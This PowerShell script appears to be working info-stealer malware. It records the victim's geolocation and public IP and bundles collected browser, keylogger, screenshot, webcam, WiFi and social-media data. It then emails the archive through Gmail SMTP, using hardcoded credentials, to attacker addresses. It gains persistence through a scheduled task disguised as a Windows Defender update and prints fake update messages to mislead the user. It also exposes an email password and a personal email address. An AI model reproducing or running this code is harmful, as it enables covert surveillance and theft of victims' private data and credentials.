Start-Sleep -Milliseconds 60
$location = ($pwd).path

Add-Type -AssemblyName System.Device 
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 
$GeoWatcher.Start() 
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 100 
}  

echo ***************location************** > C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt
if ($GeoWatcher.Permission -eq 'Denied'){
    $Host.UI.WriteDebugLine("Allow apps to access location")
    
} else {
    $GeoWatcher.Position.Location | Select Latitude,Longitude >> C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt | Out-Null
}

echo To know Location: >> C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt
echo https://www.latlong.net/Show-Latitude-Longitude.html >> C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt
echo **************************************************** >> C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt




if(!(Test-Path "C:\Users\Public\Licence\count.txt")) {
    [int]$count=0
    echo "$count"> "C:\Users\Public\Licence\count.txt"
}else{
    $count= Get-Content "C:\Users\Public\Licence\count.txt"
}


       try { 
       schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR "C:\Users\Public\Licence\Extension\Autorun.vbs" /ST 23:55 | Out-Null
       }
       catch {
       $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("10080")) -RepeatIndefinitely
       $action = New-ScheduledTaskAction -Execute "C:\Users\Public\Licence\Extension\Autorun.vbs"
       Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "System Update" -Description "Windows Defender Antivirus Regular Update." -Force
       }
  	
	
     $error.clear()
     try { 
	   Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption
     }
     catch { echo "Microsoft Windows" }
     

Start-Sleep -Milliseconds 10
if (!(test-connection 8.8.8.8 -Count 1 -Quiet)) {
    Start-Sleep -Milliseconds 100
    echo " "
    echo " "
    echo "Error: Error in connect()"
    Start-Sleep -Milliseconds 100
    (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content	
        Start-Sleep -Milliseconds 1000
        echo "Checking internet connection.."
	Start-Sleep -Milliseconds 5000
    echo "No internet connection? Try again!!"  
    Start-Sleep -Milliseconds 100 
}     
else{
    echo " "   
    echo " "
    echo " "
    echo " "    
    echo 'Gathering information.'
    Start-Sleep -Milliseconds 80  
    $ip= (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
  

    $smtpserver = "smtp.gmail.com"
    $msg = new-object Net.Mail.MailMessage
    $smtp = New-Object Net.Mail.SmtpClient($smtpServer )
    $smtp.Timeout = 400000
    $smtp.EnableSsl = $True
    $smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official@gmail.com", "com@microsoft"); 
    $msg.From = "com.microsoft.official@gmail.com"
    $msg.To.Add("com.microsoft.official@gmail.com")
    $msg.To.Add("abukawsar.shakil.9@gmail.com")





    $msg.Subject = "$env:computername ### {$ip ($count)}"
    $msg.Body = "New small Hack Arrived. Lets Enjoy !!!"                     

    $file1 = "C:\Users\Public\Licence\SystemUpdate.zip"

    if(Test-Path $file1) {
    Remove-Item  $file1 -Recurse -Force -Confirm:$false
    }
	
	
	   

     $error.clear()
     try { 
        Compress-Archive -Path C:\Users\Public\Licence\Microsoft -DestinationPath "C:\Users\Public\Licence\SystemUpdate.zip" -Force -Confirm:$false
        $msg.Attachments.Add($file1)
     
     }
     catch { 

  

    $Licence= "C:\Users\Public\Licence"
    $Microsoft= "C:\Users\Public\Licence\Microsoft"
    $A310Logger= "C:\Users\Public\Licence\Microsoft\A310Logger"
    $Browsers= "C:\Users\Public\Licence\Microsoft\A310Logger\Browsers"
    $Edge= "C:\Users\Public\Licence\Microsoft\A310Logger\Browsers\Edge"
    $Firefox= "C:\Users\Public\Licence\Microsoft\A310Logger\Browsers\Firefox"
    $Google= "C:\Users\Public\Licence\Microsoft\A310Logger\Browsers\Google"
    $Addons= "C:\Users\Public\Licence\Microsoft\Addons"
    $Chrome= "C:\Users\Public\Licence\Microsoft\Chrome"
    $Firefox2= "C:\Users\Public\Licence\Microsoft\Firefox"
    $IExplorer= "C:\Users\Public\Licence\Microsoft\IExplorer"
    $Location= "C:\Users\Public\Licence\Microsoft\Location"
    $Opera= "C:\Users\Public\Licence\Microsoft\Opera"
    $Safari= "C:\Users\Public\Licence\Microsoft\Safari"
    $Screenshot= "C:\Users\Public\Licence\Microsoft\Screenshot"
    $Social= "C:\Users\Public\Licence\Microsoft\Social"
    $Task= "C:\Users\Public\Licence\Microsoft\Task"
    $Utility= "C:\Users\Public\Licence\Microsoft\Utility"
    $Webcam= "C:\Users\Public\Licence\Microsoft\Webcam"
    $WiFi= "C:\Users\Public\Licence\Microsoft\WiFi"



    $ErrorActionPreference = "silentlyContinue"

    foreach($file in Get-ChildItem $Licence) { $msg.Attachments.Add($file.FullName)  }
    foreach($file in Get-ChildItem $Microsoft) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $A310Logger) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Browsers) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Edge) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Firefox) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Google) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Addons) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Chrome) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Firefox2) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $IExplorer) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Location) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Opera) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Safari) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Screenshot) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Social) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Task) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Utility) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $Webcam) { $msg.Attachments.Add($file.FullName) }
    foreach($file in Get-ChildItem $WiFi) { $msg.Attachments.Add($file.FullName) }
       
    }




    Start-Sleep -Milliseconds 100
    echo "This process will take some time. Please wait.."
    Start-Sleep -Milliseconds 100
    $smtp.Send($msg) | Out-Null
    Start-Sleep -Milliseconds 500
    echo '17 file updated & 3 updates found.' 
     
    }   
    $count= [int]$count+1
    $count > "C:\Users\Public\Licence\count.txt"
    Start-Sleep -Milliseconds 10
    exit
